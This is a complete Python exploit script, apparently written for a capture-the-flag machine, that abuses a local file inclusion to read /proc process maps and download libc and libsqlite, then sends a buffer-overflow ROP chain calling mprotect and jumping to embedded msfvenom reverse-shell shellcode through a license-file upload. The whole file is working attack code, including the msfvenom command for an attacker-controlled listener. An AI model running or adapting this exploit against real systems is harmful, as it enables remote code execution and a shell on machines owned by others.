from pwn import *
import requests
import sys
import re
import os

def usage():
    print(f'Usage: exploit.py <target_url> <target_port>')
    exit()

def find_pid():
    # Find PID of activate_license binary using LFI
    r = requests.get(f'{URL}:{PORT}/index.php?page=/proc/sched_debug', allow_redirects=False)
    pid = re.search('activate_licens\s+([0-9]+)',r.text).group(1)
    print(f'[+] Found PID of activate_license binary: ' + pid)
    return pid

def get_info(pid):
    r = requests.get(f'{URL}:{PORT}/index.php?page=/proc/{pid}/maps', allow_redirects=False)
    
    # Grab addreses of libc, libsqlite, stack and calculate size of stack
    libc_base      = int(re.search('^.*libc.*$',r.text, re.M).group(0).split('-')[0],16)
    libsqlite_base = int(re.search('^.*libsqlite.*$',r.text, re.M).group(0).split('-')[0],16)
    stack_base     = int(re.search('^.*stack.*$',r.text, re.M).group(0).split('-')[0],16)
    stack_end      = int(re.search('^.*stack.*$',r.text, re.M).group(0).split('-')[1].split(' ')[0],16)
    
    # Grab the paths where libc and libsqlite reside
    libc_path      = re.search('^.*libc.*$',r.text, re.M).group(0).split(' ')[-1]
    libsqlite_path = re.search('^.*libsqlite.*$',r.text, re.M).group(0).split(' ')[-1]

    return libc_base, libsqlite_base, stack_base, stack_end, libc_path, libsqlite_path

def download_file(path):
    r = requests.get(f'{URL}:{PORT}/index.php?page={path}', allow_redirects=False)
    cwd = os.getcwd()
    downloaded_file = cwd + '/' + f'{path.split("/")[-1]}'
    with open(downloaded_file, 'wb') as f:
        f.write(r.content)
    return downloaded_file

def main():

    if len(sys.argv) < 3:
        usage()

    global URL, PORT
    URL = sys.argv[1]
    PORT = sys.argv[2]
    if 'http://' not in URL:
        URL = 'http://' + sys.argv[1]

    # Get PID of activate_license binary
    pid = find_pid()
    if not pid:
        print('[-] PID not found!')

    # Query /proc/PID/maps
    libc_base, libsqlite_base, stack_base, stack_end, libc_path, libsqlite_path = get_info(pid)
    print('[+] Found libc/libsqlite addresses and paths')

    # Calculate the stack size
    stack_size = stack_end - stack_base # 0x21000
    print('[+] Stack size: ' + str(hex(stack_size)))

    context.update(arch='amd64', os='linux')
    offset            = 520 # this offset is weird, because this exploit also works with 524 (1st 4bytes read from the socket go into msglen, so 512 (buffer) + 4 (msglen) + 8 (overwrite RBP)) when I manually typed in the addresses, 
                            # so apparently pwntools, when automating, does something weird when extracting addresses with ELF() and/or ROP()
    libc              = ELF(download_file(libc_path),      checksec=False)
    libsqlite         = ELF(download_file(libsqlite_path), checksec=False)
    libc.address      = libc_base
    libsqlite.address = libsqlite_base

    # Find ROP gadgets
    rop = ROP([libc, libsqlite])

    pop_rdi  = rop.rdi[0]               # ropper -f libc.so.6 --search "pop rdi"
    pop_rsi  = rop.rsi[0]               # ropper -f libc.so.6 --search "pop rsi"
    pop_rdx  = rop.rdx[0]               # ropper -f libc.so.6 --search "pop rdx"
    mprotect = libc.symbols['mprotect'] # readelf -s libc.so.6 | grep mprotect
    jmp_rsp  = rop.jmp_rsp[0]           # ropper -f libsqlite3.so.0.8.6 --search "jmp rsp"

    # Generate shellcode with msfvenom (msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_listen_port> -b '\x00\x0a\x0d' -f python)
    shellcode =  b""
    shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
    shellcode += b"\xef\xff\xff\xff\x48\xbb\x30\x72\x90\x10\x24\xc2\x1a"
    shellcode += b"\xa8\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    shellcode += b"\x5a\x5b\xc8\x89\x4e\xc0\x45\xc2\x31\x2c\x9f\x15\x6c"
    shellcode += b"\x55\x52\x11\x32\x72\x8b\x29\x2e\xc8\x14\xf5\x61\x3a"
    shellcode += b"\x19\xf6\x4e\xd2\x40\xc2\x1a\x2a\x9f\x15\x4e\xc1\x44"
    shellcode += b"\xe0\xcf\xbc\xfa\x31\x7c\xcd\x1f\xdd\xc6\x18\xab\x48"
    shellcode += b"\xbd\x8a\xa1\x87\x52\x1b\xfe\x3f\x57\xaa\x1a\xfb\x78"
    shellcode += b"\xfb\x77\x42\x73\x8a\x93\x4e\x3f\x77\x90\x10\x24\xc2"
    shellcode += b"\x1a\xa8"

    # Build payload
    payload  = b"A" * offset
    payload += p64(pop_rdi) + p64(stack_base) # pop addr of stack into rdi
    payload += p64(pop_rsi) + p64(stack_size) # pop stack_size into rsi
    payload += p64(pop_rdx) + p64(0x7)        # pop rwx permissions into rdx
    payload += p64(mprotect)                  # call mprotect
    payload += p64(jmp_rsp)                   # jmp rsp from libsqlite
    payload += shellcode                      # revshell shellcode

    # Send payload by uploading a file on /beta.html, get a revshell, ???
    r = requests.post(f'{URL}:{PORT}/activate_license.php', files = {'licensefile': payload})

if __name__ == '__main__':
    main()
